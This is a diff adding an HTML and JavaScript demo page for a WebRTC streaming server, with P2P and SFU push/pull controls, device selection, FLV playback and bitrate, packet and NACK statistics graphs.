+                                        // append to chart
+                                        bitrateSeries.addPoint(now, bitrate);
+                                        bitrateGraph.setDataSeries([bitrateSeries]);
+                                        bitrateGraph.updateEndDate();
+
+                                        // calculate number of packets and append to chart
+                                        const packetSecond =  packets - lastResult.get(res.id).packetsSent;
+                                        packetSeries.addPoint(now, packetSecond);
+                                        packetGraph.setDataSeries([packetSeries]);
+                                        packetGraph.updateEndDate();
+
+                                        // calculate number of nack rtcp packets received and append to chart
+                                        const nackSecond = retransmittedPacketsSent - lastResult.get(res.id).retransmittedPacketsSent;
+                                        nackSeries.addPoint(now, nackSecond);
+                                        nackGraph.setDataSeries([nackSeries]);
+                                        nackGraph.updateEndDate();
+                                    }
+                                }
+                            });
+                            $("[id=stats]").html(statsString);
+                            lastResult = results;
+                        }
+                    );
+
+                    this.stat();
+                } else {
+                    $("[id=stats]").html("");
+                }
+            }, 1000);
+        }
+
+    }
+
+    function showUserAgent() {
+        var userAgent = navigator.userAgent;
+        $("[id=userAgent]").html(userAgent);
+    }
+
+    function isIE() {
+        return navigator.userAgent.indexOf("compatible") > -1 && userAgent.indexOf("MSIE") > -1;
+    }
+
+    function isEdge() {
+        // return navigator.userAgent.indexOf("Edge") > -1 && !isIE();
+        return (adapter.browserDetails.browser == 'edge');
+    }
+
+    function isSafari() {
+        return (adapter.browserDetails.browser == 'safari');
+    }
+
+    function isFirefox() {
+        return (adapter.browserDetails.browser == 'firefox');
+    }
+
+    function draw() {
+        // var video = $("[id=localVideo]")[0];
+        // var img = $("[id=localImg]")[0];
+        imageFilter.draw();
+
+        setTimeout(() => {
+            draw();
+        }, 50);
+    }
+
+    async function p2pOffer(isLocalVideo) {
+        callDirection = 'offer';
+        sendGetToken($("#p2pUserId").val());
+    }
+
+    async function call(isPull, isLocalVideo) {
+        if (typeof (client) != "undefined") {
+            client.close();
+        }
+        rtc.hangup();
+
+        reset();
+        pushVideo = isLocalVideo;
+        if (isPull) {
+            callType = 'pull';
+            $("[id=videoConfigDiv]").attr("style", 'display: none');
+            $("[id=videoRemoteDescLabel]").attr("style", 'display: block');
+        } else {
+            callType = 'push';
+            $("[id=videoDescLabel]").attr("style", 'display: block');
+        }
+
+        await connect();
+        sendGetToken($("#stream").val());
+
+        $("[id=pushBtn]").attr("disabled", 'true');
+        $("[id=pullBtn]").attr("disabled", 'true');
+        $("[id=pushVideoBtn]").attr("disabled", 'true');
+        $("[id=hangupBtn]").removeAttr("disabled");
+    }
+
+    function onload() {
+        if (!window.navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            alert('WebRTC.mediaDevices is not supported.');
+        } else {
+            window.navigator.mediaDevices.getUserMedia({video: true, audio: true}).then(mediaStream => {
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(
+                        track => track.stop()
+                    );
+                }
+                navigator.mediaDevices.enumerateDevices().then(gotDevices).catch(handleError);
+            }).catch(handleError);
+            //navigator.mediaDevices.enumerateDevices().then(gotDevices).catch(handleError);
+            var supportedConstraints = navigator.mediaDevices.getSupportedConstraints();
+            console.log('SupportedConstraints : ', supportedConstraints);
+        }
+
+        if (!window.RTCPeerConnection) {
+            alert('WebRTC.RTCPeerConnection is not supported.');
+        }
+
+        console.log("Browser is " + adapter.browserDetails.browser);
+
+        var canvas = $("[id=localCanvas]")[0];
+        imageFilter = new ImageFilter();
+        imageFilter.init(canvas);
+
+        var img = $("[id=localImg]")[0];
+        img.onload = function () {
+            imageFilter.drawImage(img);
+            imageFilter.draw();
+        }
+
+        rtc = new RTCClient();
+        rtc.onicecandidate = (sdp, candidate) => {
+            $("[id=localSdpTextarea]").html(rtc.pc.localDescription.sdp);
+            if (callType == 'push' || callType == 'pull') {
+                if (callAlready) {
+                    // Update sdp to media server
+                    // let json = JSON.stringify(event.candidate);
+                    // console.log("Rtc onicecandidate, candidate: ", json);
+                    // sendSdpUpdate($("[id=stream]").val(), rtc.pc.localDescription.sdp);
+                }
+            }
+        };
+
+        rtc.onicecomplete = () => {
+            // Get Whole sdp with ice candidate, but it maybe cost time
+            $("[id=localSdpTextarea]").html(rtc.pc.localDescription.sdp);
+            // Send sdp call to media server
+            if (callType == 'push') {
+                sendSdpCall($("#stream").val(), $("#localSdpTextarea").val());
+            } else if (callType == 'pull') {
+                sendSdpPull($("#stream").val(), $("#localSdpTextarea").val(), $("#serverId").val());
+            } else if (callType == 'p2p' && callDirection == 'offer') {
+                sendP2POffer($("#p2pPeerId").val(), $("#localSdpTextarea").val())
+            } else if (callType == 'p2p' && callDirection == 'answer') {
+                $("[id=localSdpTextarea]").html(rtc.pc.localDescription.sdp);
+                sendP2PAnswer($("#p2pPeerId").val(), $("#localSdpTextarea").val());
+            }
+        }
+
+        $("[id=p2pLoginBtn]").click(function () {
+            console.log("# P2P Login");
+            reset();
+
+            $("[id=pushBtn]").attr("disabled", 'true');
+            $("[id=pullBtn]").attr("disabled", 'true');
+            $("[id=pushVideoBtn]").attr("disabled", 'true');
+            $("[id=hangupBtn]").attr("disabled", 'true');
+            $("[id=cmdBtn]").attr("disabled", 'true');
+            $("[id=flvjsBtn]").attr("disabled", 'true');
+            $("[id=flvjsDestroyBtn]").attr("disabled", 'true');
+            $("[id=videoDescLabel]").attr("style", 'display: block');
+            $("[id=videoRemoteDescLabel]").attr("style", 'display: block');
+
+            sendP2PLogin($("#p2pUserId").val());
+        });
+
+        $("[id=p2pOfferBtn]").click(function () {
+            console.log("# P2P Offer");
+            p2pOffer(false);
+        });
+
+        $("[id=p2pAnswerBtn]").click(function() {
+            console.log("# P2P Answer");
+            $("[id=videoDescLabel]").attr("style", 'display: block');
+            $("[id=videoRemoteDescLabel]").attr("style", 'display: block');
+
+            callDirection = 'answer';
+            let remoteSdp = $("#remoteSdpTextarea").val();
+            let offer = {
+                type: 'offer',
+                sdp: remoteSdp
+            }
+
+            rtc.p2pAnswer(offer).then( function success() {
+                console.log("# P2P Answer OK");
+                rtc.stat();
+            }, function fail(reason) {
+                console.log("# P2P Answer Fail, e:" + reason);
+            });
+        });
+
+        $("[id=p2pHangupBtn]").click(function() {
+            console.log("# P2P Hangup");
+            rtc.hangup();
+            if (typeof (client) != "undefined") {
+                client.close();
+            }
+
+            $("[id=localVideo]").attr("style", 'display: none');
+            $("[id=remoteVideo]").attr("style", 'display: none');
+        });
+
+        $("[id=pushBtn]").click(function () {
+            call(false, false);
+        });
+
+        $("[id=pullBtn]").click(function () {
+            call(true);
+        });
+
+        $("[id=acceptBtn]").click(function accept() {
+            let remoteSdp = $("#remoteSdpTextarea").val();
+            let answer = {
+                type: 'answer',
+                sdp: remoteSdp
+            }
+            rtc.accpet(answer).then(function success() {
+                console.log("# Rtc Accept OK");
+            }, e => {
+                console.log("# Rtc  Accept Fail, e: ", e);
+
+                if (typeof (client) != "undefined") {
+                    client.close();
+                }
+                rtc.hangup();
+            })
+        });
+
+        $("[id=pushVideoBtn]").click(function () {
+            call(false, true);
+        });
+        if ( isEdge() ) {
+            $("[id=pushVideoBtn]").attr("style", 'display:none');
+        }
+
+        $("[id=pushWebGLBtn]").click(function () {
+            call(false, true);
+        });
+        if ( isEdge() ) {
+            $("[id=pushWebGLBtn]").attr("style", 'display:none');
+        }
+
+        $("[id=hangupBtn]").click(function () {
+            console.log("Rtc Hangup");
+            rtc.hangup();
+            if (typeof (client) != "undefined") {
+                client.close();
+            }
+
+            $("[id=localVideo]").attr("style", 'display: none');
+            $("[id=remoteVideo]").attr("style", 'display: none');
+        });
+        $("[id=hangupBtn]").attr("disabled", 'true');
+
+
+        $("[id=videoSource]").change(function () {
+            $("[id=pushBtn]").click();
+        });
+
+        $("[id=cmdBtn]").click(function () {
+            sendCmd().then(() => {
+                // client.close();
+            });
+        });
+
+        $("[id=flvjsBtn]").click(function () {
+            flv_load_mds($("#stream").val());
+        });
+        $("[id=flvjsDestroyBtn]").click(function () {
+            flv_destroy();
+        });
+
+        // Choose video constraints
+        getVideoWithConstraints(autoConstraints, 'AUTO');
+        // getVideoWithConstraints(vgaConstraints, 'VGA');
+        $("[id=autoBtn]").click(function () {
+            getVideoWithConstraints(autoConstraints, 'AUTO');
+        });
+        $("[id=qvgaBtn]").click(function () {
+            getVideoWithConstraints(qvgaConstraints, 'QVGA');
+        });
+        $("[id=vgaBtn]").click(function () {
+            getVideoWithConstraints(vgaConstraints, 'VGA');
+        });
+        $("[id=hdBtn]").click(function () {
+            getVideoWithConstraints(hdConstraints, 'HD');
+        });
+        $("[id=fullHdBtn]").click(function () {
+            getVideoWithConstraints(fullHdConstraints, 'FullHD');
+        });
+
+        bitrateGraph = new TimelineGraphView('bitrateGraph', 'bitrateCanvas');
+        bitrateGraph.updateEndDate();
+
+        packetGraph = new TimelineGraphView('packetGraph', 'packetCanvas');
+        packetGraph.updateEndDate();
+
+        nackGraph = new TimelineGraphView('nackGraph', 'nackCanvas');
+        nackGraph.updateEndDate();
+    }
+
+    function handleError(e) {
+        console.log('WebRTC.handleError:', e);
+        toast(e);
+    }
+
+    function gotDevices(deviceInfos) {
+        // Handles being called several times to update labels. Preserve values.
+        let defaultVideo;
+        let defaultAudio;
+        for (let i = 0; i !== deviceInfos.length; ++i) {
+            const deviceInfo = deviceInfos[i];
+            // console.log('Got Device: ', deviceInfo);
+
+            if (deviceInfo.kind === 'videoinput') {
+                console.log('Got Video Capture Input : ', deviceInfo);
+                $("[id=videoSelector]").append("<option value=" + deviceInfo.deviceId + ">" + "label:" + deviceInfo.label + ", deviceId:" + deviceInfo.deviceId + "</option>");
+                let n = deviceInfo.label.search('e2eSoft');
+                if ( n > -1 ) {
+                    defaultVideo = deviceInfo.deviceId;
+                    $("[id=videoSelector]").val(defaultVideo);
+                }
+            } else if (deviceInfo.kind === 'audioinput') {
+                console.log('Got Audio Capture Input : ', deviceInfo);
+                $("[id=audioSelector]").append("<option value=" + deviceInfo.deviceId + ">" + "label:" + deviceInfo.label + ", deviceId:" + deviceInfo.deviceId + "</option>");
+                let n = deviceInfo.label.search('e2eSoft');
+                if ( n > -1 ) {
+                    defaultAudio = deviceInfo.deviceId;
+                    $("[id=audioSelector]").val(defaultAudio);
+                }
+            }
+        }
+    }
+
+    function getVideoWithConstraints(constraints, name) {
+        let jsonConst = JSON.stringify(constraints);
+        $("[id=videoConstLabel]").html('Now is ' + name + ', ' + jsonConst);
+
+        // let videoTestConfig = {video: constraints};
+        videoConstraints = constraints;
+    }
+
+    function flv_load_mds(stream) {
+        let mediaDataSource = {
+            url:'http://' + window.location.hostname + ':8889/flv8889?app=cdn_standard&stream=' + stream,
+            type: 'flv',
+            isLive: 1,
+            hasAudio:1,
+            hasVideo:1,
+        };
+
+        flv_destroy();
+        player = flvjs.createPlayer(mediaDataSource, {
+            enableWorker: false,
+            lazyLoadMaxDuration: 3 * 60,
+            seekType: 'range',
+            autoCleanupMaxBackwardDuration: 3,
+            autoCleanupMinBackwardDuration: 1,
+        });
+
+        let element = $("[id=flvjsVideo]")[0];
+        $("[id=flvjsVideo]").attr("style", 'display: block');
+        player.attachMediaElement(element);
+        player.load();
+    }
+
+    function flv_destroy() {
+        if ( typeof player != "undefined" && player != null ) {
+            player.pause();
+            player.unload();
+            player.detachMediaElement();
+            player.destroy();
+            player = null;
+        }
+        $("[id=flvjsVideo]").attr("style", 'display: none');
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+        onload();
+        showUserAgent();
+    });
+    // window.onload = onload();
+
+</script>
+
+<body>
+<div id="">
+    UserAgent :
+    <lable id="userAgent"></lable>
+    <br>
+    Websocket Status :
+    <lable id="status">Not Connected</lable>
+    <br>
+    <a href="files/cacert.crt">请先导入根证书</a>
+    <p>############################ Stream Config ############################</p>
+    <div class="video-box">
+        <div id="local">
+            <div id="errMsg" style="display: none">
+                Error Msg : <font color="#FF0000">
+                <lable id="errMsgLabel"></lable>
+            </font>
+            </div>
+            <div id="rtmpUrl" style="display: none">
+                RTMP Play Url :
+                <lable id="rtmpUrlLabel"></lable>&nbsp;<a href="#" id="rtmpUrlHerf" target="blank"
+                                                          name="play">Flash播放</a>
+                <br>
+                FLV Url :
+                <lable id="flvUrlLabel"></lable>&nbsp;<a href="#" id="flvUrlHerf" target="blank"
+                                                         name="play">Flvjs播放</a>
+                <br>
+                <br>
+                <!--HLS Flv Url : <lable id="hlsUrlLabel"></lable>&nbsp;<a href="#" id="hlsUrlHerf" target="blank" name="play">HLS播放</a>-->
+            </div>
+
+            <p>############################ P2P ############################</p>
+            # User : <input id="p2pUserId" type="text" name="" value="A"/><br>
+            # PeerId : <input id="p2pPeerId" type="text" name="" value="B"/><br>
+            <div>
+                <button id="p2pLoginBtn">Login</button>
+                <button id="p2pOfferBtn">Offer</button>
+                <button id="p2pAnswerBtn" style="display:none">Answer</button>
+                <button id="p2pHangupBtn">Hangup</button>
+            </div>
+            <p>############################ SFU ############################</p>
+            # Stream : <input id="stream" type="text" name="" value="max0"/><br>
+            # ServerId : <input id="serverId" type="text" name="" value=""/><br>
+
+            <p># Local SDP</p>
+            <textarea id="localSdpTextarea" disabled="true"></textarea>
+            <div>Force Tcp <input id="forceTcpCb" type="checkbox"> Reconnect <input id="reconnectCb" type="checkbox"> </div>
+            <div>
+                <button id="pushBtn">Push</button>
+                <button id="pullBtn">Pull</button>
+                <button id="pushVideoBtn">PushVideo</button>
+                <button id="pushWebGLBtn" style="display: none">PushWebGL</button>
+                <button id="acceptBtn" style="display: none;">Accept</button>
+                <button id="hangupBtn">Hangup</button>
+                <button id="cmdBtn">Cmd</button>
+                <button id="flvjsBtn">Flvjs</button>
+                <button id="flvjsDestroyBtn">FlvjsDestroy</button>
+            </div>
+
+            <div id="videoConfigDiv">
+                <p>############################ Video Config ############################</p>
+                <div class="button">
+                    <button id="autoBtn">AUTO</button>
+                    <button id="qvgaBtn">QVGA</button>
+                    <button id="vgaBtn">VGA</button>
+                    <button id="hdBtn">HD</button>
+                    <button id="fullHdBtn">FullHD</button>
+                    <lable id="videoConstLabel"></lable>
+                </div>
+                <p></p>
+                <div>Video:<select id="videoSelector"></select></div>
+                <div>Audio:<select id="audioSelector"></select></div>
+            </div>
+            <p></p>
+            <label id="videoDescLabel">############################ Local Video ############################</label>
+            <video id="localVideo" width="640" height="480" autoplay style="display:none" loop="loop" playsinline="true"></video>
+            <canvas id="localCanvas" width="640" height="480" style="display:none"></canvas>
+            <img id="localImg" src="img/1.jpg" style="display: none">
+            <label id="videoRemoteDescLabel">############################ Remote Video ############################</label>
+            <video id="remoteVideo" width="640" height="480" autoplay style="display:none" loop="loop" playsinline="true"></video>
+            <label id="flvjsVideoDescLabel">############################ Flvjs Player ############################</label>
+            <video id="flvjsVideo" class="" style="display: none" autoplay="" src="">
+                Your browser is too old which doesn't support HTML5 video.
+            </video>
+        </div>
+        <div class="display-flex">
+            <div class="display-item">
+                <div><label id="bitrateLabel">Bitrate</label></div>
+                <canvas id="bitrateCanvas"></canvas>
+            </div>
+            <div class="display-item">
+                <div><label id="packetLabel">RTP Packets sent per second</label></div>
+                <canvas id="packetCanvas"></canvas>
+            </div>
+            <div class="display-item">
+                <div><label id="nackLabel">Nack receive per second</label></div>
+                <canvas id="nackCanvas"></canvas>
+            </div>
+        </div>
+        <label id="stats"></label>
+    </div>
+
+    <div id="remote">
+        <p># Remote SDP </p>
+        <textarea id="remoteSdpTextarea"></textarea>
+    </div>
+
+    <p>################################################################
+    <div style="color:#00F000">
+        json recv :
+        <lable id="jsonRecv"></lable>
+    </div>
+    <div style="color:#F00000">
+        json request :
+        <lable id="jsonSend"></lable>
+    </div>
+    <div style="color:#0000F0">
+        json respond :
+        <lable id="jsonRespond"></lable>
+    </div>
+
+</div>
+</form>
+</body>
+</html>
